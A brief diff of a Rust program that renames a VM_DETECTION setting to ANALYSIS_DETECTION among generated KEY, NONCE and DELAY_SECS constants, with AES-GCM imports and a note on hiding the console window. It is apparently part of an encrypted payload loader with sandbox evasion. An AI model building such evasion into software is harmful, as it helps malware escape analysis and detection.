@@ -1,7 +1,7 @@
 // #![windows_subsystem = "windows"] // Uncomment to link as a GUI-subsystem PE (no console window) 
 mod generated;
 mod logger;
-use generated::{KEY, NONCE, DELAY_SECS, VERBOSE, VM_DETECTION};
+use generated::{KEY, NONCE, DELAY_SECS, VERBOSE, ANALYSIS_DETECTION};
 use std::error::Error;
 use::std::time::{Duration, Instant};
 use aes_gcm::{
